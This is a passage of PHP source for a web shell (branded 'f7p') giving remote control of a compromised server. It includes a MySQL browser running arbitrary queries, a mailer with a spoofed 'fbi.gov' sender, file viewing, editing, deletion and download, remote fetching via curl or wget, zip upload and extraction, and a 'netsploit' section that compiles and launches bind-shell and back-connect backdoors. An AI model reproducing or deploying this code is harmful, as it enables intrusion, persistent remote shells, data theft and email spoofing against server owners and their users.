                    $msg = $msgq."<div class='table-wrap'><table class=\"explore\"><thead><tr><th>Tables in ".$db."</th></tr></thead><tbody>";
                    $hasil = @mysql_list_tables($db,$con);
                    while(list($table) = @mysql_fetch_row($hasil)){
                        @array_push($tables,$table);
                    }
                    @sort($tables);
                    foreach($tables as $table){
                        $msg .= "<tr><td><a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."&amp;table=".$table."\">".$table."</a></td></tr>";
                    }
                    $msg .= "</tbody></table></div>";
                }
                elseif(isset($_GET['table']) && (!isset($_GET['sqlquery']))){
                    $db = $_GET['db'];
                    $table = $_GET['table'];
                    $query = "SELECT * FROM ".$db.".".$table." LIMIT 0,50;";
                    $msgq  = "<div style='padding:4px;'><form action=\"?\" method=\"get\">
                    <input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
                    <input type=\"hidden\" name=\"x\" value=\"mysql\" />
                    <input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
                    <input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
                    <input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
                    <input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
                    <input type=\"hidden\" name=\"db\" value=\"".$db."\" />
                    <input type=\"hidden\" name=\"table\" value=\"".$table."\" />
                    <textarea name=\"sqlquery\" class=\"output\" style=\"height:80px;\">".$query."</textarea>
                    <div class='cmd-row mt-2'><input class=\"inputzbut\" style=\"width:100%;\" name=\"submitquery\" type=\"submit\" value=\"Execute\" /></div>
                    </form></div>";
                    $msg = $msgq."<div class='table-wrap'><table class=\"explore\"><thead><tr>";
                    $hasil = @mysql_query("SHOW FIELDS FROM ".$db.".".$table);
                    while(list($column) = @mysql_fetch_row($hasil)){
                        $msg .= "<th>".$column."</th>";
                    }
                    $msg .= "</tr></thead><tbody>";
                    $hasil = @mysql_query("SELECT * FROM ".$db.".".$table." LIMIT 0,50");
                    while($datas = @mysql_fetch_assoc($hasil)){
                        $msg .= "<tr>";
                        foreach($datas as $data){
                            if(trim($data) == "") $data = "&nbsp;";
                            $msg .= "<td>".htmlspecialchars(substr($data,0,30))."</td>";
                        }
                        $msg .= "</tr>";
                    }
                    $msg .= "</tbody></table></div>";
                }
                elseif(isset($_GET['submitquery']) && ($_GET['sqlquery'] != "")){
                    $db = $_GET['db'];
                    $query = magicboom($_GET['sqlquery']);
                    $msgq  = "<div style='padding:4px;'><form action=\"?\" method=\"get\">
                    <input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
                    <input type=\"hidden\" name=\"x\" value=\"mysql\" />
                    <input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
                    <input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
                    <input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
                    <input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
                    <input type=\"hidden\" name=\"db\" value=\"".$db."\" />
                    <textarea name=\"sqlquery\" class=\"output\" style=\"height:80px;\">".$query."</textarea>
                    <div class='cmd-row mt-2'><input class=\"inputzbut\" style=\"width:100%;\" name=\"submitquery\" type=\"submit\" value=\"Execute\" /></div>
                    </form></div>";
                    $msg = $msgq;
                    @mysql_select_db($db);
                    $querys = explode(";",$query);
                    foreach($querys as $q){
                      if(trim($q) != ""){
                        $hasil = mysql_query($q);
                        if($hasil){
                            $msg .= "<p class='text-success' style='font-size:12px;margin:4px 0;'>".htmlspecialchars($q)."</p>";
                            $msg .= "<div class='table-wrap'><table class=\"explore\"><thead><tr>";
                            for($i=0;$i<@mysql_num_fields($hasil);$i++)
                                $msg .= "<th>".htmlspecialchars(@mysql_field_name($hasil,$i))."</th>";
                            $msg .= "</tr></thead><tbody>";
                            for($i=0;$i<@mysql_num_rows($hasil);$i++)
                            {
                                $rows=@mysql_fetch_array($hasil);
                                $msg .= "<tr>";
                                for($j=0;$j<@mysql_num_fields($hasil);$j++)
                                {
                                    $dataz = ($rows[$j] == "") ? "&nbsp;" : htmlspecialchars(substr($rows[$j],0,40));
                                    $msg .= "<td>".$dataz."</td>";
                                }
                                $msg .= "</tr>";
                            }
                            $msg .= "</tbody></table></div>";
                        }
                        else $msg .= "<p class='text-danger' style='font-size:12px;margin:4px 0;'>".htmlspecialchars($q)."</p>";
                      }
                    }
                }
                else {
                    $query = "SHOW DATABASES;";
                    $msgq  = "<div style='padding:4px;'><form action=\"?\" method=\"get\">
                    <input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
                    <input type=\"hidden\" name=\"x\" value=\"mysql\" />
                    <input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
                    <input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
                    <input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
                    <input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
                    <textarea name=\"sqlquery\" class=\"output\" style=\"height:80px;\">".$query."</textarea>
                    <div class='cmd-row mt-2'><input class=\"inputzbut\" style=\"width:100%;\" name=\"submitquery\" type=\"submit\" value=\"Execute\" /></div>
                    </form></div>";
                    $dbs = array();
                    $msg = $msgq."<div class='table-wrap'><table class=\"explore\"><thead><tr><th>Databases</th></tr></thead><tbody>";
                    $hasil = @mysql_list_dbs($con);
                    while(list($db) = @mysql_fetch_row($hasil)){
                        @array_push($dbs,$db);
                    }
                    @sort($dbs);
                    foreach($dbs as $db){
                        $msg .= "<tr><td><a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."\">".$db."</a></td></tr>";
                    }
                    $msg .= "</tbody></table></div>";
                }
                @mysql_close($con);
            }
            else $msg = "<p class='text-center text-danger'>Cannot connect to MySQL</p>";
            echo $msg;
        }
        else{
        ?>
        <form action="?" method="get">
            <input type="hidden" name="y" value="<?php echo $pwd; ?>" />
            <input type="hidden" name="x" value="mysql" />
            <table class="tabnet">
                <tr><th colspan="2">Connect to MySQL</th></tr>
                <tr><td>Host</td><td><input class="inputz w-full" type="text" name="sqlhost" value="localhost" /></td></tr>
                <tr><td>User</td><td><input class="inputz w-full" type="text" name="sqluser" value="root" /></td></tr>
                <tr><td>Pass</td><td><input class="inputz w-full" type="text" name="sqlpass" value="password" /></td></tr>
                <tr><td>Port</td><td><input class="inputz" style="width:60px;" type="text" name="sqlport" value="3306" /> <input class="inputzbut" type="submit" value="Connect" name="submitsql" /></td></tr>
            </table>
        </form>
        <?php }
    }
    elseif(isset($_GET['x']) && ($_GET['x'] == 'mail')){
        if(isset($_POST['mail_send'])){
            $mail_to = $_POST['mail_to'];
            $mail_from = $_POST['mail_from'];
            $mail_subject = $_POST['mail_subject'];
            $mail_content = magicboom($_POST['mail_content']);
            if(@mail($mail_to,$mail_subject,$mail_content,"FROM:$mail_from")){
                $msg = "Email sent to $mail_to";
            }
            else $msg = "Send failed";
        }
    ?>
        <form action="?y=<?php echo $pwd; ?>&amp;x=mail" method="post">
            <textarea class="output" name="mail_content" style="height:250px;">Hey there, please patch me ASAP ;-p</textarea>
            <div style="display:flex;align-items:center;gap:8px;margin:4px 0;">
    <span style="font-size:13px;color:#666;width:70px;flex-shrink:0;">To:</span>
    <input class="inputz" style="flex:1;" type="text" value="admin@example.com" name="mail_to" />
</div>
<div style="display:flex;align-items:center;gap:8px;margin:4px 0;">
    <span style="font-size:13px;color:#666;width:70px;flex-shrink:0;">From:</span>
    <input class="inputz" style="flex:1;" type="text" value="f7p@fbi.gov" name="mail_from" />
</div>
<div style="display:flex;align-items:center;gap:8px;margin:4px 0;">
    <span style="font-size:13px;color:#666;width:70px;flex-shrink:0;">Subject:</span>
    <input class="inputz" style="flex:1;" type="text" value="patch me" name="mail_subject" />
</div>
            <div class="cmd-row mt-2"><input class="inputzbut" style="width:100%;" type="submit" value="Send" name="mail_send" /></div>
            <div style="text-align:center;margin:4px;font-size:14px;"><?php echo $msg; ?></div>
        </form>
    <?php
    }
    elseif(isset($_GET['x']) && ($_GET['x'] == 'phpinfo')){
        @ob_start();
        @eval("phpinfo();");
        $buff = @ob_get_contents();
        @ob_end_clean();
        $awal = strpos($buff,"<body>")+6;
        $akhir = strpos($buff,"</body>");
        echo "<div class=\"phpinfo\">".substr($buff,$awal,$akhir-$awal)."</div>";
    }
    elseif(isset($_GET['img']) && ($_GET['img'] != "")){
    $file = magicboom($_GET['img']);
    
    if(is_file($file)){
        $file_extension = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'ico'];
        
        if(in_array($file_extension, $image_extensions)){
            $size = ukuran($file);
            $perms = get_perms($file);
            $filn = basename($file);
            
            echo "<div style='margin:4px 0;text-align:center;font-size:16px;font-weight:bold;color:#0066cc;'>" . htmlspecialchars(basename($file)) . "</div>";
            echo "<div style='display:flex;gap:6px;flex-wrap:wrap;margin:4px 0;font-size:13px;justify-content:center;'>";
            echo "<span>Size: $size</span>";
            echo "<span>Perms: $perms</span>";
            echo "</div>";
            echo "<div style='display:flex;gap:8px;flex-wrap:wrap;margin:4px 0;justify-content:center;'>";
            echo "<a href=\"?y=$pwd&amp;delete=$file\" onclick=\"return confirmDelete('" . addslashes($filn) . "', 'file');\" data-no-ajax=\"true\">Delete</a>";
            echo "<a href=\"?y=$pwd&amp;dl=$file\" data-no-ajax=\"true\">Download</a>";
            echo "<a href=\"?y=$pwd&amp;dlgzip=$file\" data-no-ajax=\"true\">.gz</a>";
            echo "</div>";
            
            echo "<div style='text-align:center;background:#fff;padding:20px;border-radius:6px;border:1px solid #eee;'>";
            echo "<img src='?img_direct=" . urlencode($file) . "' style='max-width:100%;max-height:80vh;' />";
            echo "</div>";
        } else {
            echo "<div style='padding:20px;color:#cc3333;text-align:center;'>File bukan gambar</div>";
        }
    } else {
        echo "<div style='padding:20px;color:#cc3333;text-align:center;'>File tidak ditemukan</div>";
    }
}
    elseif(isset($_GET['view']) && ($_GET['view'] != "")){
    $file = magicboom($_GET['view']);
    
    if(is_file($file)){
        $file_extension = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'ico'];
        
        if(in_array($file_extension, $image_extensions)){
            header("Location: ?y=" . urlencode($pwd) . "&img=" . urlencode($file));
            exit;
        }
        
        if(!$win && $posix){
            $name = @posix_getpwuid(@fileowner($file));
            $group = @posix_getgrgid(@filegroup($file));
            $owner = $name['name'] . " : " . $group['name'];
        } else {
            $owner = $user;
        }
        
        $filn = basename($file);
        $file_size = ukuran($file);
        $file_perms = get_perms($file);
        
        echo "<div style='margin:4px 0;text-align:center;font-size:16px;font-weight:bold;color:#0066cc;'>" . htmlspecialchars(basename($file)) . "</div>";
echo "<div style='display:flex;gap:6px;flex-wrap:wrap;margin:4px 0;font-size:13px;justify-content:center;'>";
echo "<span>Size: $file_size</span>";
echo "<span>Perms: $file_perms</span>";
echo "<span>Owner: $owner</span>";
echo "</div>";
echo "<div style='display:flex;gap:8px;flex-wrap:wrap;margin:4px 0;justify-content:center;'>";
echo "<a href=\"?y=$pwd&amp;edit=$file\" data-no-ajax=\"true\">Edit</a>";
echo "<a href=\"?y=$pwd&amp;delete=$file\" onclick=\"return confirmDelete('" . addslashes($filn) . "', 'file');\" data-no-ajax=\"true\">Delete</a>";
echo "<a href=\"?y=$pwd&amp;dl=$file\" data-no-ajax=\"true\">Download</a>";
echo "<a href=\"?y=$pwd&amp;dlgzip=$file\" data-no-ajax=\"true\">.gz</a>";
echo "<a href=\"?y=" . $pwd . "&amp;view=" . $file . "&amp;type=code\">Code</a>";
echo "</div>";
        
        if(isset($_GET['type']) && ($_GET['type'] == 'code')){
            echo "<div class=\"viewfile\">";
            $file_content = @file_get_contents($file);
            if($file_content !== false) {
                @highlight_string($file_content);
            } else {
                echo "Cannot read file (error: " . error_get_last()['message'] . ")";
            }
            echo "</div>";
        } else {
            echo "<div class=\"viewfile\">";
            $content = @file_get_contents($file);
            if($content !== false) {
                echo nl2br(htmlentities($content, ENT_QUOTES, 'UTF-8'));
            } else {
                echo "Cannot read file (error: " . error_get_last()['message'] . ")";
            }
            echo "</div>";
        }
    } else {
        echo "<div style='padding:20px;color:#cc3333;'>File tidak ditemukan: " . htmlspecialchars($file) . "</div>";
    }
}
 
elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){
    $file = isset($_GET['edit']) ? $_GET['edit'] : '';
    
   
    $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'ico'];
    $file_ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $is_image = in_array($file_ext, $image_extensions);
    
   
    if ($is_image && file_exists($file) && is_file($file)) {
        header("Location: ?y=" . urlencode($pwd) . "&img=" . urlencode($file));
        exit;
    }
    
   
    if(isset($_POST['save'])){
        $file = $_POST['saveas'];
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        if(empty($content) && isset($_POST['content_plain'])) {
            $content = $_POST['content_plain'];
        }
        $timezones = [
            'Asia/Jakarta', 'Asia/Makassar', 'Asia/Jayapura',
            'Asia/Singapore', 'Asia/Bangkok', 'Asia/Ho_Chi_Minh',
            'Asia/Kuala_Lumpur', 'Asia/Manila', 'Asia/Tokyo',
            'America/New_York', 'America/Los_Angeles', 'Europe/London',
            'Europe/Paris', 'Australia/Sydney'
        ];
        $user_timezone = isset($_POST['user_timezone']) ? $_POST['user_timezone'] : 'Asia/Jakarta';
        if (!in_array($user_timezone, $timezones)) {
            $user_timezone = 'Asia/Jakarta';
        }
        @date_default_timezone_set($user_timezone);
        $msg = "";
        if($filez = @fopen($file,"w")){
            $time = date("h:i:s A", time());
            if(@fwrite($filez, $content)) {
                $msg = "Saved at <strong>" . $time . "</strong>";
            } else {
                $msg = "Failed to write";
            }
            @fclose($filez);
        } else {
            $msg = "Permission denied";
        }
    }
    
    $content = "";
    if(file_exists($file) && is_file($file)){
        if($filez = @fopen($file,"r")){
            while(!feof($filez)){
                $content .= fgets($filez);
            }
            @fclose($filez);
        }
    }
    
    $display_content = htmlspecialchars($content, ENT_QUOTES, 'UTF-8');
    $content_base64 = base64_encode($content);
    ?>
    
    <form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo urlencode($file); ?>" method="post" id="editForm" onsubmit="return false;">
        <input type="hidden" name="saveas" value="<?php echo htmlspecialchars($file, ENT_QUOTES, 'UTF-8'); ?>">
        <textarea class="output" name="content_plain" id="editorContent" style="height:400px;"><?php echo $display_content; ?></textarea>
        <div id="saveStatus" style="text-align:right;font-size:12px;"></div>
        <?php
        if(isset($msg) && $msg != "") {
            echo "<div style='text-align:right;font-size:12px;'>{$msg}</div>";
        }
        ?> 
        <div class="cmd-row mt-2" style="display:flex;gap:8px;align-items:center;width:100%;flex-wrap:wrap;">
            <a href="?y=<?php echo $pwd; ?>" data-no-ajax="true"><img width=24px src=f7p-assets/previous.png></a>
            <input class="inputz" id="saveas_input" type="text" value="<?php echo htmlspecialchars($file, ENT_QUOTES, 'UTF-8'); ?>" style="flex:2;min-width:120px;" readonly />
            <input class="inputzbut" type="submit" value="Save" name="save" id="saveBtn" style="flex:1;min-width:70px;" />
        </div>
        
        <div class="cmd-row mt-2" style="display:flex;gap:8px;align-items:center;width:100%;flex-wrap:wrap;">
            <span style="font-size:13px;color:#666;white-space:nowrap;flex-shrink:0;"><img width=24px src=f7p-assets/github.png></span>
            <input class="inputz" id="github_full_path" type="text" style="flex:2;min-width:120px;font-size:13px;font-family:monospace;" 
                   value="Loading..." readonly />
            <input class="inputzbut" type="button" value="Push to Git" id="pushToGitBtn" onclick="pushToGitHub()" style="flex:1;min-width:70px;background:#2b3137;opacity:0.5;cursor:not-allowed;" disabled /> 
        </div>
        
        <div class="cmd-row mt-2" style="display:flex;gap:8px;flex-wrap:wrap;">
            <input class="inputzbut" type="button" value="Copy" id="copyContentBtn" style="flex:1;background:#006600;" />
            <input class="inputzbut" type="button" value="Paste + Save" id="pasteSaveBtn" style="flex:1;background:#ff0000;" />
            <input class="inputzbut" type="button" value="Remove Comments" id="removeCommentsBtn" style="flex:1;background:#d29922;" />
        </div>
    </form>
    
    <script>
    (function(){
        if(window._f7p_edit_initialized) return;
        window._f7p_edit_initialized = true;
        
        var DB_NAME='F7P_EditorDB';var DB_VERSION=1;var STORE_NAME='files';var db=null;
        var editor=document.getElementById('editorContent');var saveBtn=document.getElementById('saveBtn');
        var statusDiv=document.getElementById('saveStatus');
        var filePath='<?php echo addslashes($file); ?>';
        
        function openDB(){return new Promise(function(resolve,reject){if(db){resolve(db);return;}var r=indexedDB.open(DB_NAME,DB_VERSION);r.onerror=function(e){reject('IndexedDB error: '+e.target.error);};r.onsuccess=function(e){db=e.target.result;resolve(db);};r.onupgradeneeded=function(e){var d=e.target.result;if(!d.objectStoreNames.contains(STORE_NAME)){d.createObjectStore(STORE_NAME,{keyPath:'path'});}};});}
        function saveToDB(path,content){return new Promise(function(resolve,reject){openDB().then(function(db){var t=db.transaction([STORE_NAME],'readwrite');var s=t.objectStore(STORE_NAME);var r=s.put({path:path,content:content,timestamp:Date.now()});r.onsuccess=function(){resolve();};r.onerror=function(){reject('Failed to save');};}).catch(reject);});}
        function getFromDB(path){return new Promise(function(resolve,reject){openDB().then(function(db){var t=db.transaction([STORE_NAME],'readonly');var s=t.objectStore(STORE_NAME);var r=s.get(path);r.onsuccess=function(){resolve(r.result?r.result.content:null);};r.onerror=function(){reject('Failed to read');};}).catch(reject);});}
        function deleteFromDB(path){return new Promise(function(resolve,reject){openDB().then(function(db){var t=db.transaction([STORE_NAME],'readwrite');var s=t.objectStore(STORE_NAME);var r=s.delete(path);r.onsuccess=function(){resolve();};r.onerror=function(){reject('Failed to delete');};}).catch(reject);});}
        function uploadFile(filePath,content){return new Promise(function(resolve,reject){var fd=new FormData();var blob=new Blob([content],{type:'application/octet-stream'});var fn=filePath.split('/').pop();fd.append('file_upload',blob,fn);fd.append('file_path',filePath);fd.append('overwrite','1');var xhr=new XMLHttpRequest();xhr.open('POST',window.location.href+'&x=upload_ajax',true);xhr.onload=function(){if(xhr.status===200){try{var resp=JSON.parse(xhr.responseText);if(resp.success){resolve(resp);}else{reject(resp.message||'Upload failed');}}catch(e){reject('Invalid response');}}else{reject('HTTP error: '+xhr.status);}};xhr.onerror=function(){reject('Network error');};xhr.send(fd);});}
        function saveFileViaIndexedDB(filePath,content){return new Promise(function(resolve,reject){saveToDB(filePath,content).then(function(){return uploadFile(filePath,content);}).then(function(resp){deleteFromDB(filePath).catch(function(){});resolve(resp);}).catch(function(err){reject(err);});});}
        function restoreFromIndexedDB(filePath){return getFromDB(filePath);}
        
        getFromDB(filePath).then(function(content){if(content){editor.value=content;}}).catch(function(){});
        
        function updateStatus(msg){
            if(statusDiv){
                statusDiv.innerHTML = msg;
            } else {
                var div=document.querySelector('#editForm div[style*="text-align:right"]');
                if(div){div.innerHTML=msg;}
            }
        }
        
        var saveHandler = function(e){
            e.preventDefault();
            var content=editor.value;
            if(!content&&content!==''){alert('Content is empty');return;}
            saveBtn.disabled=true;saveBtn.value='Saving...';saveBtn.style.background = '#CECECE';
            saveFileViaIndexedDB(filePath,content).then(function(resp){
                var now=new Date();
                var h=now.getHours();var m=String(now.getMinutes()).padStart(2,'0');var s=String(now.getSeconds()).padStart(2,'0');
                var ampm=h>=12?'PM':'AM';h=h%12||12;
                var timeStr=h+':'+m+':'+s+' '+ampm;
                var msgHtml='Saved at <strong>'+timeStr+'</strong>';
                updateStatus(msgHtml);
                saveBtn.value='Save';saveBtn.disabled=false;saveBtn.style.background = '';
            }).catch(function(err){
                alert('Save failed: '+err);
                saveBtn.value='Save';saveBtn.disabled=false;
            });
        };
        
        if(saveBtn){
            saveBtn.removeEventListener('click', saveHandler);
            saveBtn.addEventListener('click', saveHandler);
        }
        
        document.addEventListener('keydown',function(e){if((e.ctrlKey||e.metaKey)&&e.key==='s'){e.preventDefault();if(document.activeElement===editor||document.activeElement===saveBtn){saveBtn.click();}}});
        
        var pasteBtn=document.getElementById('pasteSaveBtn');
        if(pasteBtn&&editor){
            pasteBtn.addEventListener('click',function(){
                if(!navigator.clipboard){alert('Clipboard not available');return;}
                var btn=this;var orig=btn.value;btn.value='Reading...';btn.disabled=true;
                navigator.clipboard.readText().then(function(text){
                    if(text&&text.trim()!==''){
                        editor.value=text;
                        btn.value='Pasted';
                        setTimeout(function(){btn.value=orig;btn.disabled=false;},1500);
                        saveBtn.click();
                    }else{alert('Clipboard empty');btn.value=orig;btn.disabled=false;}
                }).catch(function(err){alert('Failed: '+err.message);btn.value=orig;btn.disabled=false;});
            });
        }
        
        var copyBtn=document.getElementById('copyContentBtn');
        if(copyBtn&&editor){
            copyBtn.addEventListener('click',function(){
                var btn=this;var orig=btn.value;var content=editor.value;
                if(!content||content.trim()===''){alert('Nothing to copy');return;}
                if(!navigator.clipboard){
                    var ta=document.createElement('textarea');ta.value=content;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);btn.value='Copied';
                }else{
                    navigator.clipboard.writeText(content).then(function(){btn.value='Copied';}).catch(function(){alert('Failed to copy');return;});
                }
                btn.disabled=true;setTimeout(function(){btn.value=orig;btn.disabled=false;},1500);
            });
        }
    
    })();
    </script>
    
    <script src="f7p-assets/_script_editpage.js"></script>
    <script src="f7p-assets/_script.js"></script>
<?php }
elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){
    $msg_url = '';
    $msg_file = '';
    $msg_zip = '';
    
    if(isset($_POST['uploadurl'])){
        $pilihan = trim($_POST['pilihan']);
        $wurl = trim($_POST['wurl']);
        $path = isset($_POST['path']) ? $_POST['path'] : $pwd;
        if(!empty($path) && substr($path, -1) !== '/' && substr($path, -1) !== '\\'){
            $path .= DIRECTORY_SEPARATOR;
        }
        $namafile = download($pilihan, $wurl);
        $pindah = $path . $namafile;
        if(is_file($pindah)) {
            $msg_url = '✅ Transferred to ' . $pindah;
        } else {
            $msg_url = '❌ Failed to transfer';
        }
    }
    
    if(isset($_POST['uploadcomp'])){
        if(isset($_FILES['file']) && $_FILES['file']['error'] !== UPLOAD_ERR_NO_FILE){
            $target_dir = isset($_POST['path']) ? $_POST['path'] : $pwd;
            if(!empty($target_dir) && substr($target_dir, -1) !== '/' && substr($target_dir, -1) !== '\\'){
                $target_dir .= DIRECTORY_SEPARATOR;
            }
            
            $total_uploaded = 0;
            $total_failed = 0;
            
            if (isset($_FILES['file']['name']) && is_array($_FILES['file']['name'])) {
                $file_count = count($_FILES['file']['name']);
                for ($i = 0; $i < $file_count; $i++) {
                    if ($_FILES['file']['error'][$i] === UPLOAD_ERR_OK) {
                        $original_name = basename($_FILES['file']['name'][$i]);
                        $dest = $target_dir . $original_name;
                        if (move_uploaded_file($_FILES['file']['tmp_name'][$i], $dest)) {
                            $total_uploaded++;
                        } else {
                            $total_failed++;
                        }
                    } else {
                        $total_failed++;
                    }
                }
                
                if ($total_uploaded > 0) {
                    $msg_file = '✅ ' . $total_uploaded . ' file(s) uploaded';
                    if ($total_failed > 0) {
                        $msg_file .= ' (' . $total_failed . ' failed)';
                    }
                } else {
                    $msg_file = '❌ Upload failed';
                }
            }
        } else {
            $msg_file = '❌ No file selected';
        }
    }
    
    if(isset($_POST['uploadzip'])){
        if(isset($_FILES['zip_file']) && $_FILES['zip_file']['error'] === UPLOAD_ERR_OK){
            $target_dir = isset($_POST['path']) ? $_POST['path'] : $pwd;
            if(!empty($target_dir) && substr($target_dir, -1) !== '/' && substr($target_dir, -1) !== '\\'){
                $target_dir .= DIRECTORY_SEPARATOR;
            }
            
            $zip_name = basename($_FILES['zip_file']['name']);
            $zip_ext = strtolower(pathinfo($zip_name, PATHINFO_EXTENSION));
            
            if($zip_ext !== 'zip'){
                $msg_zip = '❌ Only ZIP files allowed!';
            } else {
                $zip_path = $target_dir . $zip_name;
                
                if(move_uploaded_file($_FILES['zip_file']['tmp_name'], $zip_path)){
                    if(class_exists('ZipArchive')){
                        $zip = new ZipArchive();
                        if($zip->open($zip_path) === true){
                            $zip->extractTo($target_dir);
                            $zip->close();
                            @unlink($zip_path);
                            $msg_zip = '✅ Extracted: ' . htmlspecialchars($zip_name);
                        } else {
                            $msg_zip = '❌ Extract failed';
                        }
                    } else {
                        $msg_zip = '❌ ZipArchive not available';
                    }
                } else {
                    $msg_zip = '❌ Upload failed';
                }
            }
        } else {
            $msg_zip = '❌ No ZIP file';
        }
    }
    ?>
    <div class="upload-container">
    
    
    <form method="post" action="?y=<?php echo $pwd; ?>&amp;x=upload" class="upload-form">
        <?php if ($msg_url): ?>
            <div class="upload-msg <?php echo strpos($msg_url, '✅') !== false ? 'upload-msg-success' : 'upload-msg-error'; ?>">
                <?php echo $msg_url; ?>
            </div>
        <?php endif; ?>
        
        <div class="upload-row">
            <div class="upload-input-wrap">
                <input class="inputz" type="text" name="wurl" placeholder="Upload from URL">
                <span class="upload-paste-btn" onclick="navigator.clipboard.readText().then(t=>{if(t)this.previousElementSibling.value=t})" title="Paste from clipboard">📋</span>
            </div>
            <select name="pilihan" class="upload-select">
                <option value="wcurl">curl</option>
                <option value="wwget">wget</option>
                <option value="wfread">fread</option>
            </select>
            <input class="upload-btn-go" type="submit" name="uploadurl" value="Go">
        </div>
        <input type="hidden" name="path" value="<?php echo $pwd; ?>">
    </form>
    
    
    <form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post" class="upload-form">
        <?php if ($msg_file): ?>
            <div class="upload-msg <?php echo strpos($msg_file, '✅') !== false ? 'upload-msg-success' : 'upload-msg-error'; ?>">
                <?php echo $msg_file; ?>
            </div>
        <?php endif; ?>
        
        <div class="upload-row">
            <input type="file" name="file[]" multiple id="localFileInput" class="upload-file-input">
            <input class="upload-btn-local" type="button" value="📁 Upload from Local" onclick="document.getElementById('localFileInput').click();">
            <span id="localFileCount" class="upload-file-count upload-file-count-local"></span>
            <input class="upload-btn-upload" type="submit" name="uploadcomp" value="Upload">
        </div>
        <input type="hidden" name="path" value="<?php echo $pwd; ?>">
    </form>
    
    
    <form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post" class="upload-form upload-form-zip">
        <?php if ($msg_zip): ?>
            <div class="upload-msg <?php echo strpos($msg_zip, '✅') !== false ? 'upload-msg-success' : 'upload-msg-error'; ?>">
                <?php echo $msg_zip; ?>
            </div>
        <?php endif; ?>
        
        <div class="upload-row">
            <input type="file" name="zip_file" accept=".zip" id="zipFileInput" class="upload-file-input">
            <input class="upload-btn-zip" type="button" value="📦 Upload + Unzip" onclick="document.getElementById('zipFileInput').click();">
            <span id="zipFileCount" class="upload-file-count upload-file-count-zip"></span>
            <input class="upload-btn-extract" type="submit" name="uploadzip" value="Extract">
        </div>
        <input type="hidden" name="path" value="<?php echo $pwd; ?>">
    </form>
    
</div>
    <script>
    (function() {
        var localInput = document.getElementById('localFileInput');
        var localCount = document.getElementById('localFileCount');
        if (localInput && localCount) {
            localInput.addEventListener('change', function() {
                var count = this.files.length;
                if (count > 0) {
                    localCount.textContent = count + ' file(s)';
                    localCount.style.color = '#0066cc';
                } else {
                    localCount.textContent = '';
                }
            });
        }
        
        var zipInput = document.getElementById('zipFileInput');
        var zipCount = document.getElementById('zipFileCount');
        if (zipInput && zipCount) {
            zipInput.addEventListener('change', function() {
                var file = this.files[0];
                if (file) {
                    var size = (file.size / 1024 / 1024).toFixed(2);
                    zipCount.textContent = file.name + ' (' + size + 'MB)';
                    zipCount.style.color = '#ff9800';
                } else {
                    zipCount.textContent = '';
                }
            });
        }
    })();
    </script>
    
    <?php
}
    elseif(isset($_GET['x']) && ($_GET['x'] == 'netsploit')){
        if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
            $port = trim($_POST['port']);
            $passwrd = trim($_POST['bind_pass']);
            tulis("bdc.c",$port_bind_bd_c);
            exe("gcc -o bdc bdc.c");
            exe("chmod 777 bdc");
            @unlink("bdc.c");
            exe("./bdc ".$port." ".$passwrd." &");
            $scan = exe("ps aux");
            if(eregi("./bdc $por",$scan)){ $msg = "Backdoor running"; }
            else { $msg = "Not running"; }
        }
        elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
            $port = trim($_POST['port']);
            $passwrd = trim($_POST['bind_pass']);
            tulis("bdp",$port_bind_bd_pl);
            exe("chmod 777 bdp");
            $p2=which("perl");
            exe($p2." bdp ".$port." &");
            $scan = exe("ps aux");
            if(eregi("$p2 bdp $port",$scan)){ $msg = "Backdoor running"; }
            else { $msg = "Not running"; }
        }
        elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
            $ip = trim($_POST['ip']);
            $port = trim($_POST['backport']);
            tulis("bcc.c",$back_connect_c);
            exe("gcc -o bcc bcc.c");
            exe("chmod 777 bcc");
            @unlink("bcc.c");
            exe("./bcc ".$ip." ".$port." &");
            $msg = "Connecting to ".$ip.":".$port." ...";
        }
        elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
            $ip = trim($_POST['ip']);
            $port = trim($_POST['backport']);
            tulis("bcp",$back_connect);
            exe("chmod +x bcp");
            $p2=which("perl");
